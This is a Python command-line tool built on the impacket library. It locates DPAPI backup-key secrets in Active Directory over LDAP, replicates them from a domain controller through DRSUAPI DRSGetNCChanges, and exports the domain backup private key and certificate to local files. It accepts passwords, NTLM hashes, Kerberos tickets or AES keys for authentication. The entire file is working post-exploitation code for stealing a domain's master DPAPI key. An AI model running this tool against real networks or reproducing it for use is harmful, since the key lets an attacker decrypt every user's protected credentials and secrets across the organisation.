#!/usr/bin/env python

from __future__ import division
from __future__ import print_function
import argparse
import codecs
import logging
import os
import sys
import binascii
import struct

from datetime import datetime
from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, epm, drsuapi
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.dtypes import NULL

from pyasn1.codec.der import decoder
from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.examples.utils import parse_target
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.uuid import string_to_bin, bin_to_string
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.dpapi import P_BACKUP_KEY, PREFERRED_BACKUP_KEY, PVK_FILE_HDR


class RemoteOperations:
    def __init__(self, smbConnection, doKerberos, kdcHost=None):
        self.__smbConnection = smbConnection
        if self.__smbConnection is not None:
            self.__smbConnection.setTimeout(5*60)
        self.__domainName = None
        
        self.__drsr = None
        self.__hDrs = None
        self.__NtdsDsaObjectGuid = None
        self.__ppartialAttrSet = None
        self.__prefixTable = []
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost


    def __connectDrds(self):
        stringBinding = epm.hept_map(self.__smbConnection.getRemoteHost(), drsuapi.MSRPC_UUID_DRSUAPI,
                                     protocol='ncacn_ip_tcp')
        rpc = transport.DCERPCTransportFactory(stringBinding)
        rpc.setRemoteHost(self.__smbConnection.getRemoteHost())
        rpc.setRemoteName(self.__smbConnection.getRemoteName())
        if hasattr(rpc, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpc.set_credentials(*(self.__smbConnection.getCredentials()))
            rpc.set_kerberos(self.__doKerberos, self.__kdcHost)
        self.__drsr = rpc.get_dce_rpc()
        self.__drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        if self.__doKerberos:
            self.__drsr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__drsr.connect()
        # Uncomment these lines if you want to play some tricks
        # This will make the dump way slower tho.
        #self.__drsr.bind(samr.MSRPC_UUID_SAMR)
        #self.__drsr = self.__drsr.alter_ctx(drsuapi.MSRPC_UUID_DRSUAPI)
        #self.__drsr.set_max_fragment_size(1)
        # And Comment this line
        self.__drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)

        if self.__domainName is None:
            # Get domain name from credentials cached
            self.__domainName = rpc.get_credentials()[2]

        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs) #- 4
        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | \
                         drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = drsuapi.NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = 0
        drs['ConfigObjGUID'] = drsuapi.NULLGUID
        # I'm uber potential (c) Ben
        drs['dwExtCaps'] = 0xffffffff
        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(drs.getData())
        resp = self.__drsr.request(request)
        
        if logging.getLogger().level == logging.DEBUG:
            logging.debug(f'DRSBind() answer: \n {resp.dump()}')
        

        # Let's dig into the answer to check the dwReplEpoch. This field should match the one we send as part of
        # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

        # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
        ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
        len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
        drsExtensionsInt.fromString(ppextServer)

        if drsExtensionsInt['dwReplEpoch'] != 0:
            # Different epoch, we have to call DRSBind again
            
            logging.debug("DC's dwReplEpoch != 0, setting it to %d and calling DRSBind again" % drsExtensionsInt[
                    'dwReplEpoch'])
            drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
            request['pextClient']['cb'] = len(drs)
            request['pextClient']['rgb'] = list(drs.getData())
            resp = self.__drsr.request(request)

        self.__hDrs = resp['phDrs']

        # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
        resp = drsuapi.hDRSDomainControllerInfo(self.__drsr, self.__hDrs, self.__domainName, 2)
        
        if logging.getLogger().level == logging.DEBUG:
            logging.debug('DRSDomainControllerInfo() answer')
            resp.dump()

        if resp['pmsgOut']['V2']['cItems'] > 0:
            self.__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
        else:
            logging.error("Couldn't get DC info for domain %s" % self.__domainName)
            raise Exception('Fatal, aborting')
    
    def getDrsr(self):
        return self.__drsr

    def DRSCrackNames(self, formatOffered=drsuapi.DS_NAME_FORMAT.DS_DISPLAY_NAME,
                      formatDesired=drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name=''):
        if self.__drsr is None:
            self.__connectDrds()

        logging.debug('Calling DRSCrackNames for %s ' % name)
        resp = drsuapi.hDRSCrackNames(self.__drsr, self.__hDrs, 0, formatOffered, formatDesired, (name,))
        return resp

    def DRSGetNCChanges(self, userEntry):
        if self.__drsr is None:
            self.__connectDrds()

        #userEntry = '{1c2007ae-09b8-4345-a4fa-1063754b0678}'
        logging.debug('Calling DRSGetNCChanges for objectGuid %s ' % userEntry)
        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = self.__hDrs
        request['dwInVersion'] = 8

        request['pmsgIn']['tag'] = 8
        request['pmsgIn']['V8']['uuidDsaObjDest'] = self.__NtdsDsaObjectGuid
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__NtdsDsaObjectGuid

        dsName = drsuapi.DSNAME()
        dsName['SidLen'] = 0
        dsName['Guid'] = string_to_bin(userEntry)
        dsName['Sid'] = ''
        dsName['NameLen'] = 0
        dsName['StringName'] = ('\x00')

        dsName['structLen'] = len(dsName.getData())

        request['pmsgIn']['V8']['pNC'] = dsName

        request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
        request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0

        request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL

        request['pmsgIn']['V8']['ulFlags'] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ
        
        request['pmsgIn']['V8']['pPartialAttrSet'] = NULL
        request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(self.__prefixTable)
        request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = self.__prefixTable
        request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL

        return self.__drsr.request(request)
    

class getLdapSecrets:

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__kdcHost = cmdLineOptions.dc_ip
        self.__target = cmdLineOptions.target
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__targetDomain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]
        # We can't set the KDC to a custom IP when requesting things cross-domain
        # because then the KDC host will be used for both
        # the initial and the referral ticket, which breaks stuff.
        if user_domain != target_domain and self.__kdcHost:
            logging.warning('DC ip will be ignored because of cross-domain targeting.')
            self.__kdcHost = None

    def getMachineName(self):
        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            s = SMBConnection(self.__kdcHost, self.__kdcHost)
        else:
            s = SMBConnection(self.__targetDomain, self.__targetDomain)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise 'Error while anonymous logging into %s'
        else:
            try:
                s.logoff()
            except Exception:
                # We don't care about exceptions here as we already have the required
                # information. This also works around the current SMB3 bug
                pass
        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t
    
    def hex_to_guid(self, hex):
        h = binascii.unhexlify(hex)
        return '-'.join(map(bytes.decode, map(
            binascii.hexlify, (h[0:4][::-1], h[4:6][::-1], h[6:8][::-1], h[8:10], h[10:]))))

    def run(self):
        
        logging.info(f'dumping "(objectClass=secret)" from from LDAP')

        if self.__doKerberos:
            target = self.getMachineName()
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.baseDN, self.__kdcHost)
            
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcHost)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.baseDN, self.__kdcHost)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcHost)
            else:
                raise

        # Building the search filter
        searchFilter = "(objectClass=secret)" 

        try:
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['name', 'objectGUID'],
                                         sizeLimit=10)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                raise

        answers = []
        backup_keys = {}

        for item in resp:
            logging.debug(f'entry: {item}')
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            name =  ''
            objectGUID = ''

            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'name':
                        name = str(attribute['vals'][0])
                        mustCommit = True

                    if str(attribute['type']) == 'objectGUID':
                        
                        objectGUID = bin_to_string(bytes(attribute['vals'][0]))
                        mustCommit = True

                    if name and objectGUID:
                        logging.debug(f'got name "{name}" with guid "{objectGUID}" from LDAP')
                    
                    if name and objectGUID and options.ldap_only:
                        
                        logging.info(f'got name "{name}" with guid "{objectGUID}" from LDAP')

                    backup_keys.update({name : objectGUID})
                    
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))
                pass
        
        return backup_keys


class DrsKeyObject:
    class SECRET_TYPE:
        NTDS = 0
        NTDS_CLEARTEXT = 1
        NTDS_KERBEROS = 2

    NAME_TO_INTERNAL = {
        'uSNCreated':b'ATTq131091',
        'uSNChanged':b'ATTq131192',
        'name':b'ATTm3',
        'objectGUID':b'ATTk589826',
        'objectSid':b'ATTr589970',
        'userAccountControl':b'ATTj589832',
        'primaryGroupID':b'ATTj589922',
        'accountExpires':b'ATTq589983',
        'logonCount':b'ATTj589993',
        'sAMAccountName':b'ATTm590045',
        'sAMAccountType':b'ATTj590126',
        'lastLogonTimestamp':b'ATTq589876',
        'userPrincipalName':b'ATTm590480',
        'unicodePwd':b'ATTk589914',
        'dBCSPwd':b'ATTk589879',
        'ntPwdHistory':b'ATTk589918',
        'lmPwdHistory':b'ATTk589984',
        'pekList':b'ATTk590689',
        'supplementalCredentials':b'ATTk589949',
        'pwdLastSet':b'ATTq589920',
    }

    NAME_TO_ATTRTYP = {
        'userPrincipalName': 0x90290,
        'sAMAccountName': 0x900DD,
        'unicodePwd': 0x9005A,
        'dBCSPwd': 0x90037,
        'ntPwdHistory': 0x9005E,
        'lmPwdHistory': 0x900A0,
        'supplementalCredentials': 0x9007D,
        'objectSid': 0x90092,
        'userAccountControl':0x90008,
    }

    ATTRTYP_TO_ATTID = {
        'userPrincipalName': '1.2.840.113556.1.4.656',
        'sAMAccountName': '1.2.840.113556.1.4.221',
        'unicodePwd': '1.2.840.113556.1.4.90',
        'dBCSPwd': '1.2.840.113556.1.4.55',
        'ntPwdHistory': '1.2.840.113556.1.4.94',
        'lmPwdHistory': '1.2.840.113556.1.4.160',
        'supplementalCredentials': '1.2.840.113556.1.4.125',
        'objectSid': '1.2.840.113556.1.4.146',
        'pwdLastSet': '1.2.840.113556.1.4.96',
        'userAccountControl':'1.2.840.113556.1.4.8',
        'currentValue' : '1.2.840.113556.1.4.27',
        'lastSetTime' : '1.2.840.113556.1.4.53',
        'nTSecurityDescriptor' : '1.2.840.113556.1.2.281',
        'whenCreated' : '1.2.840.113556.1.2.2',
        'instanceType' : '1.2.840.113556.1.2.1',
        'objectClass' : '2.5.4.0',
        'name' : '1.2.840.113556.1.4.1',
    }


    def __init__(self, remoteOps, guid):
        self.__guid = guid
        self.__remoteOps = remoteOps
        
    def __decryptHash(self, record, prefixTable=None, outputFile=None):
        logging.debug('Entering DrsKeyObject.__decryptHash')
        
        replyVersion = 'V%d' %record['pdwOutVersion']
        logging.debug('Decrypting currentValue for: %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
        currentValue = None

        for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
            try:
                attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
            except Exception as e:
                logging.debug('Failed to execute OidFromAttid with error %s, fallbacking to fixed table' % e)
                logging.debug('Exception', exc_info=True)
                # Fallbacking to fixed table and hope for the best
                attId = attr['attrTyp']
                LOOKUP_TABLE = self.NAME_TO_ATTRTYP

            if attId == LOOKUP_TABLE['currentValue']:
                if attr['AttrVal']['valCount'] > 0:
                    currentValue = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                else:
                    logging.error('Cannot get currentValue bytes for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                    

        if outputFile is not None:
            outputFile.flush()

        logging.debug('Leaving DrsKeyObject.__decryptHash')

        return currentValue

    def dump(self):
        hashesOutputFile = None
        decrypted_bytes = None

        try:
            
            backupKeyRecord = self.__remoteOps.DRSGetNCChanges(self.__guid)
            
            replyVersion = 'V%d' % backupKeyRecord['pdwOutVersion']
            if backupKeyRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
                raise Exception('DRSGetNCChanges didn\'t return any object!')
                
            try:
                currentValue = self.__decryptHash(backupKeyRecord,
                                    backupKeyRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
                                    hashesOutputFile)
                
                decrypted_bytes = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), currentValue)

            except Exception as e:
                logging.error("Error while processing backup key!")
                logging.debug("Exception", exc_info=True)
                logging.error(str(e))
            
        except Exception as e:
            
            logging.debug("Exception", exc_info=True)
            logging.error(str(e))
        
        return decrypted_bytes

def dumpkey(decrypted_bytes):
    try:
        keyVersion = struct.unpack('<L', decrypted_bytes[:4])[0]
        if keyVersion == 1:  # legacy key
            backup_key = P_BACKUP_KEY(decrypted_bytes)
            backupkey = backup_key['Data']
            
            logging.info("Exporting legacy key to file {}".format(domain + ".key"))
            open(domain + ".key", 'wb').write(backupkey)
            

        elif keyVersion == 2:  # preferred key
            backup_key = PREFERRED_BACKUP_KEY(decrypted_bytes)
            pvk = backup_key['Data'][:backup_key['KeyLength']]
            cert = backup_key['Data'][backup_key['KeyLength']:backup_key['KeyLength'] + backup_key['CertificateLength']]

            # build pvk header (PVK_MAGIC, PVK_FILE_VERSION_0, KeySpec, PVK_NO_ENCRYPT, 0, cbPvk)
            header = PVK_FILE_HDR()
            header['dwMagic'] = 0xb0b5f11e
            header['dwVersion'] = 0
            header['dwKeySpec'] = 1
            header['dwEncryptType'] = 0
            header['cbEncryptData'] = 0
            header['cbPvk'] = backup_key['KeyLength']
            backupkey_pvk = header.getData() + pvk  # pvk blob

            backupkey = backupkey_pvk
            
            logging.info("Exporting certificate to file {}".format(domain + ".der"))
            open(domain + ".der", 'wb').write(cert)
            logging.info("Exporting private key to file {}".format(domain + ".pvk"))
            open(domain + ".pvk", 'wb').write(backupkey)
    except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
    

class DumpBackupKey:

    decrypted_bytes = None

    def __init__(self, remoteName, guid, username='', password='', domain='', options=None):
        self.__guid = guid
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__doKerberos = options.k
        self.__smbConnection = None
        self.__remoteOps = None
        self.__DrsKeyObject = None
       
        self.__kdcHost = options.dc_ip
        self.__options = options

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:   
            try:
                try:
                    self.connect()
                except Exception as e:
                    if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                        # SMBConnection failed. That might be because there was no way to log into the
                        # target system. We just have a last resort. Hope we have tickets cached and that they
                        # will work
                        logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                        pass
                    else:
                        raise

                self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                
            except Exception as e:
                
                logging.error('RemoteOperations failed: %s' % str(e))

            logging.debug(f'Calling DrsKeyObject with objectGuid: {self.__guid}')
            
            #input("Press Enter to continue...")

            self.__DrsKeyObject = DrsKeyObject(remoteOps=self.__remoteOps, guid=self.__guid)
            try:
                decrypted_bytes = self.__DrsKeyObject.dump()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
        
        return decrypted_bytes


# Process command-line arguments.
if __name__ == '__main__':

    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                      "the remote machine without executing any agent there.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    
    parser.add_argument('-ldap-only', action='store_true', help='Just extract the GUIDs from LDAP')
    
    parser.add_argument('-key-only', action='store_true', help='dump key with provided GUID')
    parser.add_argument('--guid', required='-key-only' in sys.argv)

    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

   

    if options.target_ip is None:
        options.target_ip = remoteName

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True
    bkupkeys = {}

    
    try:
        executer = getLdapSecrets(username, password, domain, domain, options)
        bkupkeys = executer.run()
        if options.ldap_only:

            sys.exit(0)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))

    decrypted_guid = None
    
    if options.key_only:
        
        guid = options.guid

        logging.info(f'using GUID to dump key: {guid}')
        dumper = DumpBackupKey(remoteName, guid, username, password, domain, options)

        try:
            decrypted_bytes = dumper.dump()
            logging.debug(f'dumped currentValue via DRSUAPI \n {decrypted_bytes}')
            dumpkey(decrypted_bytes)
            sys.exit(0)

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
    else:    
        for keyname in bkupkeys:
            if "BCKUPKEY_PREFERRED" in keyname:
                
                guid = bkupkeys[keyname]
                logging.info(f'found "BCKUPKEY_PREFERRED" in LDAP with objectGuid "{guid}"')
                logging.info(f'Calling DumpBackupKey with objectGuid: "{guid}"')
                dumper = DumpBackupKey(remoteName, guid, username, password, domain, options)

                try:
                    decrypted_bytes = dumper.dump()
                    decrypted_guid = bin_to_string(decrypted_bytes)
                    logging.debug(f'currentValue: {decrypted_guid}')
                    break

                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error(e)

    for keyname in bkupkeys:
        try:
            decrypted_guid = decrypted_guid.lower()
            if "BCKUPKEY_{}".format(decrypted_guid) in keyname:
                
                guid = bkupkeys[keyname]
                dumper = DumpBackupKey(remoteName, guid, username, password, domain, options)

                decrypted_bytes = dumper.dump()
                logging.debug(f'dumped currentValue via DRSUAPI \n {decrypted_bytes}')
                dumpkey(decrypted_bytes)
                
        except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.error(e)
